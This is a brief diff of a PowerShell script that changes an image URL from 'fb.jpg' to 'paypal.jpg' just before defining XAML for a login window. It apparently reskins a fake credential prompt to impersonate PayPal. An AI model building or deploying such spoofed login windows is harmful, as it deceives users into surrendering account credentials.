@@ -100,7 +100,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $ms
 Write-Host "The user clicked: $Result"
 
 # Define the URL to the image hosted on GitHub
-$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
+$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/paypal.jpg"
 
 # Create XAML for the login window without specifying the icon
 $XAML = @"
